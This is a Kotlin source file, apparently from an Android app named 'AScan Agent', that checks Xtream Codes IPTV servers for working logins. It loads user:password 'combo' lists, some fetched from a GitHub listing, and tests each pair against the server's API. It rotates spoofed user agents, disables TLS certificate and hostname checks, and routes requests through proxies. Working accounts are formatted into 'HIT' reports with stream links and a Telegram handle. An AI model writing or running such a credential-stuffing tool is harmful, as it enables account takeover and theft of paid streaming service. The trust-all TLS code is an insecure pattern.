package com.ascan.ascanagent.data

import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.concurrent.TimeUnit
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager

object XtreamApi {

    private val uas = listOf(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "TiviMate/5.1.0 (Android 13)",
        "IPTV Smarters Pro",
        "VLC/3.0.20 LibVLC/3.0.20",
        "okhttp/4.12.0",
        "OTT Navigator/1.7.2.2",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
    )

    private val trustAll = object : X509TrustManager {
        override fun checkClientTrusted(chain: Array<X509Certificate>, authType: String) {}
        override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {}
        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
    }

    private val client: OkHttpClient by lazy {
        val ssl = SSLContext.getInstance("TLS")
        ssl.init(null, arrayOf<TrustManager>(trustAll), SecureRandom())
        OkHttpClient.Builder()
            .sslSocketFactory(ssl.socketFactory, trustAll)
            .hostnameVerifier { _, _ -> true }
            .connectTimeout(8, TimeUnit.SECONDS)
            .readTimeout(8, TimeUnit.SECONDS)
            .writeTimeout(8, TimeUnit.SECONDS)
            .followRedirects(true)
            .build()
    }

    fun normServer(raw: String): String {
        var s = raw.trim()
        listOf("https://", "http://", "HTTP://", "HTTPS://").forEach {
            if (s.startsWith(it)) s = s.removePrefix(it)
        }
        return s.trimEnd('/')
    }

    data class CheckResult(
        val hit: Boolean,
        val code: Int,
        val err: String,
        val data: JSONObject?
    )

    fun check(
        server: String,
        user: String,
        pass: String,
        timeoutSec: Long = 5,
        proxyUrl: String? = null
    ): CheckResult {
        val host = normServer(server)
        val url =
            "http://$host/player_api.php?username=${enc(user)}&password=${enc(pass)}"
        val c = buildClient(timeoutSec, proxyUrl)
        return try {
            val req = Request.Builder()
                .url(url)
                .header("User-Agent", uas.random())
                .header("Accept", "*/*")
                .header("Connection", "keep-alive")
                .get()
                .build()
            c.newCall(req).execute().use { resp ->
                val code = resp.code
                val body = resp.body?.string().orEmpty()
                if (code == 200 && body.isNotBlank()) {
                    try {
                        val json = JSONObject(body)
                        val ui = json.optJSONObject("user_info")
                        val st = ui?.optString("status", "")?.lowercase().orEmpty()
                        if (st in listOf("active", "1", "true", "ok")) {
                            CheckResult(true, 200, "hit", json)
                        } else {
                            CheckResult(false, 200, "inactive", json)
                        }
                    } catch (_: Exception) {
                        CheckResult(false, 200, "bad_json", null)
                    }
                } else {
                    CheckResult(false, code, "http_$code", null)
                }
            }
        } catch (e: java.net.SocketTimeoutException) {
            CheckResult(false, 0, "Timeout", null)
        } catch (e: Exception) {
            CheckResult(false, 0, e.javaClass.simpleName, null)
        }
    }

    fun buildHit(
        server: String,
        user: String,
        pass: String,
        data: JSONObject?,
        combo: String
    ): Hit {
        val host = normServer(server)
        val ui = data?.optJSONObject("user_info")
        val si = data?.optJSONObject("server_info")
        val port = if (host.contains(":")) host.substringAfter(":") else (si?.optString("port") ?: "80")
        val hostOnly = host.substringBefore(":")
        val exp = ui?.optString("exp_date", "0") ?: "0"
        val created = ui?.optString("created_at")
            ?: ui?.optString("create_date", "0")
            ?: "0"
        var unlimited = exp in listOf("0", "null", "None", "")
        var daysLeft = ""
        if (!unlimited) {
            try {
                val dias = ((exp.toLong() - System.currentTimeMillis() / 1000) / 86400).toInt()
                if (dias > 3650) unlimited = true
                else daysLeft = " · ${dias.coerceAtLeast(0)} dias"
            } catch (_: Exception) {
                unlimited = true
            }
        }
        val plan = when {
            unlimited -> "ILIMITADO"
            ui?.optString("is_trial", "0") in listOf("1", "true", "True") -> "TRIAL"
            else -> "PREMIUM"
        }
        var status = (ui?.optString("status", "Active") ?: "Active").uppercase()
        if (status in listOf("1", "TRUE", "OK", "ACTIVE")) status = "ONLINE"
        val conex = "${ui?.optString("active_cons", "0")}/${ui?.optString("max_connections", "1")}"
        val createdS = fmtTs(created)
        val expS = if (unlimited) "Ilimitado" else fmtTs(exp)
        val m3u =
            "http://$host/get.php?username=${enc(user)}&password=${enc(pass)}&type=m3u_plus&output=ts"
        val epg =
            "http://$host/xmltv.php?username=${enc(user)}&password=${enc(pass)}"
        val comboShow = combo.removeSuffix(".txt").removeSuffix(".TXT").removeSuffix(".csv")
        val head = when (plan) {
            "ILIMITADO" -> "HIT ILIMITADO"
            "TRIAL" -> "HIT TRIAL"
            else -> "HIT ONLINE"
        }
        val text = buildString {
            appendLine("✅ $head")
            appendLine("━━━━━━━━━━━━━━━━━━━━")
            appendLine("🌐 Server : http://$host")
            appendLine("💻 DNS    : $hostOnly:$port")
            appendLine("────────────────────")
            appendLine("👤 User   : $user")
            appendLine("🔑 Pass   : $pass")
            appendLine("🟢 Status : $status")
            appendLine("📋 Plano  : $plan")
            appendLine("📶 Conex  : $conex")
            appendLine("📅 Criado : $createdS")
            appendLine("⏰ Expira : $expS$daysLeft")
            appendLine("────────────────────")
            appendLine("🎬 M3U:")
            appendLine(m3u)
            appendLine("📺 EPG:")
            appendLine(epg)
            appendLine("────────────────────")
            appendLine("📂 Combo  : $comboShow")
            appendLine("✉️ Telegram: ${AppConfig.TELEGRAM}")
            appendLine("━━━━━━━━━━━━━━━━━━━━")
            appendLine("AScan Agent ${AppConfig.VERSION}")
        }
        return Hit(
            server = host,
            user = user,
            pass = pass,
            status = status,
            plan = plan,
            connections = conex,
            created = createdS,
            expires = expS,
            daysLeft = daysLeft,
            m3u = m3u,
            epg = epg,
            combo = comboShow,
            unlimited = unlimited,
            text = text
        )
    }

    private fun fmtTs(v: String): String {
        if (v in listOf("0", "", "null", "None")) return "-"
        return try {
            val ts = v.toLong()
            val sdf = java.text.SimpleDateFormat("dd/MM/yyyy", java.util.Locale.getDefault())
            sdf.format(java.util.Date(ts * 1000))
        } catch (_: Exception) {
            v
        }
    }

    private fun enc(s: String): String =
        java.net.URLEncoder.encode(s, "UTF-8")

    private fun buildClient(timeoutSec: Long, proxyUrl: String?): OkHttpClient {
        val b = client.newBuilder()
            .connectTimeout(timeoutSec, TimeUnit.SECONDS)
            .readTimeout(timeoutSec, TimeUnit.SECONDS)
        if (!proxyUrl.isNullOrBlank()) {
            try {
                val u = java.net.URI(proxyUrl)
                val host = u.host ?: return b.build()
                val port = if (u.port > 0) u.port else 80
                b.proxy(java.net.Proxy(java.net.Proxy.Type.HTTP, java.net.InetSocketAddress(host, port)))
            } catch (_: Exception) {
            }
        }
        return b.build()
    }

    fun fetchText(url: String, timeoutSec: Long = 20): String? {
        return try {
            val req = Request.Builder().url(url).header("User-Agent", "AScanAgent/2.0").get().build()
            client.newBuilder()
                .connectTimeout(timeoutSec, TimeUnit.SECONDS)
                .readTimeout(timeoutSec, TimeUnit.SECONDS)
                .build()
                .newCall(req).execute().use { r ->
                    if (r.isSuccessful) r.body?.string() else null
                }
        } catch (_: Exception) {
            null
        }
    }

    fun listGithubCombos(): List<Pair<String, String>> {
        val body = fetchText(AppConfig.COMBOS_API) ?: return emptyList()
        return try {
            val arr = org.json.JSONArray(body)
            val out = mutableListOf<Pair<String, String>>()
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                val name = o.optString("name")
                val dl = o.optString("download_url")
                if (name.endsWith(".txt", true) || name.endsWith(".csv", true)) {
                    out += name to dl
                }
            }
            out.sortedBy { it.first.lowercase() }
        } catch (_: Exception) {
            emptyList()
        }
    }

    fun parseCombo(text: String): List<Credential> {
        val out = ArrayList<Credential>()
        text.lineSequence().forEach { raw ->
            val line = raw.trim()
            if (line.isEmpty() || line.startsWith("#")) return@forEach
            val idx = line.indexOf(':')
            if (idx > 0) {
                val u = line.substring(0, idx).trim()
                val p = line.substring(idx + 1).trim()
                if (u.isNotEmpty() && p.isNotEmpty()) out += Credential(u, p)
            }
        }
        return out
    }
}
